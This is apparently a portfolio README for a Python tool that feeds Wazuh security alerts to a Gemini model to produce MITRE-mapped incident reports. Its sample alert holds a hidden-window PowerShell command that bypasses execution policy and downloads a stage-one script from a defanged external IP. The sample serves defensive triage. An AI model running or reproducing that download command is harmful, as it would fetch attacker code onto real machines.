[![Darreon Phillips Homepage](https://img.shields.io/badge/Darreon%20Phillips-Homepage-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DaPhilll)

# Generative AI Incident Triage & Investigative Reporting

## 1. Executive Summary & Objective
* **Problem Statement:** During high-severity incidents, Tier 1 and Tier 2 SOC analysts spend excessive time parsing raw, heterogeneous log formats and drafting compliance reports. This manual triage lifecycle slows down response actions and results in inconsistent documentation that fails regulatory or compliance audits (e.g., SOC 2 Type II).
* **Solution Overview:** This project establishes an automated Python pipeline that integrates Gemini 3.5 Flash with Extended Thinking directly into the incident response framework. The utility ingests unstructured security logs, extracts technical indicators of compromise (IOCs), and uses the model's advanced multi-step reasoning capabilities to engineer deterministic summaries that map directly to standard compliance reporting schemas.
* **Core Capabilities:**
  * Automated parsing of multi-vendor telemetry (Wazuh, Suricata, Windows Event Logs).
  * System-level instructions coupled with high-level thinking configurations to eliminate model hallucinations.
  * Deep reasoning analysis to accurately correlate technical raw log trails to the MITRE ATT&CK matrix.
  * Programmatic generation of audit-ready incident review artifacts.

## 2. Architecture & Environment Topology
The pipeline acts as an automated middleware layer, receiving data from ingestion frameworks, processing it via an isolated execution engine, and interacting with Google GenAI endpoints over encrypted channels.

* **Execution Runtime:** Python 3.x core engine utilizing native file handling, regex utilities, and the official Google GenAI SDK.
* **Ingestion Source Vectors:** Structural JSON output objects generated directly by upstream endpoint detection platforms (Wazuh) and security event logging channels.
* **API Integration Plane:** Synchronous communication paths engineered against the Gemini API, specifying `gemini-3.5-flash` with the `thinking_level` set to `high`.
* **Reporting Compliance Focus:** Structural validation targeting common corporate data incident controls, emphasizing timeline fidelity, containment accountability, and root-cause transparency.

## 3. Engineering Thought Process & Methodology
* **Design Considerations:** Large Language Models can exhibit logical gaps when processing complex, nested attack techniques. By deploying Gemini 3.5 Flash with its native extended thinking capability set to high, the model is forced to perform internal, multi-turn reasoning steps before outputting its conclusion. This architectural choice provides near-Pro tier analytical capabilities while maintaining fast Flash-tier processing speeds.
* **Technical Challenges & Resolution:**
  * **Challenge:** Large enterprise security logs contain voluminous metadata wrappers that exhaust standard context boundaries and distort the analytical focus of standard models.
  * **Resolution:** Leveraging Gemini 3.5 Flash's native 1-million token context window allows the ingestion of entire multi-day log trails without aggressive truncation. A structural pre-parsing extraction engine (`log_parser.py`) is still utilized to isolate actionable parameters, maximizing token processing efficiency and model output speed.

## 4. Cyber Kill Chain & Threat Lifecycle Mapping
This triage framework dynamically extracts, categorizes, and logs adversarial movements captured across key vectors of the Cyber Kill Chain:

* **Delivery & Installation:** Aggregating anomalous command strings, temporary storage drop paths, and unauthorized script executions.
* **Command & Control (C2):** Isolating public-facing IP structures, external resource requests, and ingress download utilities.
* **Actions on Objectives:** Structuring timelines detailing unauthorized data staging or access events on target instances.

## 5. MITRE ATT&CK Matrix Alignment
The prompt configuration directs the reasoning engines to align anomalous network behaviors against specific behavioral frameworks:

| Tactic | Technique ID | Technique Name | Detection/Mitigation Mechanism |
| :--- | :--- | :--- | :--- |
| **Execution** | T1059.001 | PowerShell | Normalizing and parsing hidden window parameters and execution policy bypass flags inside process telemetry streams. |
| **Command and Control** | T1105 | Ingress Tool Transfer | Isolating external network uniform resource identifiers (URIs) bound within download utility commands. |
| **Collection** | T1114 | Email Collection | Structuring audit trails for automated exfiltration or target collection activities detected inside application logs. |

## 6. Threat Intelligence & Generative AI Models Integrated
* **Model Engine:** Google Gemini 3.5 Flash (GA Edition).
* **Reasoning Control:** Enforcement of `thinking_level="high"` within the generation configuration to maximize the model's analytical depth during complex log correlation tasks.

## 7. Implementation & Code / Configuration Snippets

### Ingestion Logic & Token Optimization Engine (`log_parser.py`)
```python
import json

def load_and_clean_log(file_path):
    with open(file_path, 'r') as file:
        raw_log = json.load(file)

    # Extract only actionable security fields to save token space
    cleaned_log = {
        "timestamp": raw_log.get("timestamp"),
        "rule_description": raw_log.get("rule", {}).get("description"),
        "source_ip": raw_log.get("agent", {}).get("ip"),
        "full_log": raw_log.get("full_log")
    }
    return json.dumps(cleaned_log)
```

### Extended Thinking Prompt Engineering & AI Execution Layer (`ai_triage_engine.py`)
```python
import os
from google import genai
from google.genai import types

def generate_incident_report(cleaned_log):
    # Initialize the client (automatically reads GEMINI_API_KEY from the environment)
    client = genai.Client()

    system_prompt = """
    You are a Tier 3 SOC Analyst. Analyze the provided security log.
    Extract the following information and format it as a markdown report:
    1. Executive Summary (2-3 sentences max)
    2. Extracted IoCs (IPs, Hashes, Domains)
    3. MITRE ATT&CK Tactic/Technique mapping
    4. Recommended Containment Steps
    Do not hallucinate data. If a field is missing, state 'Not present in logs'.
    """

    # Call Gemini 3.5 Flash with Extended Thinking set to High
    response = client.models.generate_content(
        model="gemini-3.5-flash",
        contents=cleaned_log,
        config=types.GenerateContentConfig(
            system_instruction=system_prompt,
            thinking_config=types.ThinkingConfig(thinking_level="high")
        )
    )

    return response.text
```

## 8. Operational Verification & Validation (Proof of Concept)

### Main Pipeline Invocation & Execution Boundary
```bash
# Export the cryptographically isolated token payload to the environment context
export GEMINI_API_KEY="XXXXXXXXXXXXXXXXXXXXXXXXXXX"

# Execute the primary processing engine passing the target raw alert block
python main_triage.py --log ./sample_alerts/wazuh_alert_1.json --output ./reports/
```

### Raw Telemetry Ingestion Input Payload
```json
{
  "timestamp": "2026-07-02T14:22:00Z",
  "rule": {
    "description": "PowerShell execution policy bypass detected",
    "level": 7
  },
  "agent": {
    "id": "042",
    "name": "DESKTOP-492",
    "ip": "192.168.1.45"
  },
  "full_log": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest -Uri hxxp://103[.]15[.]22[.]88/stage1.ps1"
}
```

### Standardized Compliance Markdown Output File (`Incident_Report_INC001.md`)
### Executive Summary
At 2026-07-02T14:22:00Z, the SIEM detected a PowerShell execution policy bypass originating from endpoint DESKTOP-492. The process initiated an external network connection to a known malicious IP address, indicating a likely payload staging attempt.

### Extracted Indicators of Compromise (IoCs)
* **Source IP:** 192.168.1.45
* **Destination IP:** 103[.]15[.]22[.]88
* **Command Line:** `powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest...`

### MITRE ATT&CK Mapping
* **Tactic:** Execution (TA0002)
* **Technique:** Command and Scripting Interpreter: PowerShell (T1059.001)

### Recommended Containment Steps
1. Execute immediate network isolation on DESKTOP-492 via EDR.
2. Block destination IP 103[.]15[.]22[.]88 at the perimeter firewall.
3. Initiate an anti-malware scan on the affected endpoint to locate dropped payloads.
'''

<br><br><br>
[![Darreon Phillips Homepage](https://img.shields.io/badge/Darreon%20Phillips-Homepage-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DaPhilll)
